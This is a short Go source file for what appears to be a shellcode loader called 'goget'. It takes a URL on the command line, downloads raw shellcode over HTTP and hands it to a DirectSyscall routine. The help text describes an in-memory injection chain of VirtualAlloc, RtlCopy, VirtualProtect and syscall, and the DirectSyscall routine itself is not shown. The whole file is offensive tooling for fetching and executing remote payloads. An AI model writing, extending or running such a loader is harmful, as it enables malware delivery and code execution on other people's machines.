package main

import (
	"flag"
	"io"
	"net/http"
)

func main() {
	url := flag.String("u", "", "URL to download shellcode from")
	method := flag.String("m", "syscall", `method to inject the code.
	methods are:
	- syscall (virtualalloc READWRITE -> RTLCOPY -> virtualprotect EXECUTRE -> syscall)
	- thread () // not implemented
	- proc () // not implemented
	example:
	goget -m syscall
	`)
	flag.Parse()

	if *url == "" {
		flag.PrintDefaults()
		panic("[-] URL not provided")
	}

	sc := get(*url)

	switch *method {
	case "syscall":
		DirectSyscall(sc)
	default:
		DirectSyscall(sc)
	}

}

func get(url string) []byte {
	resp, err := http.Get(url)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}

	return bodyBytes
}
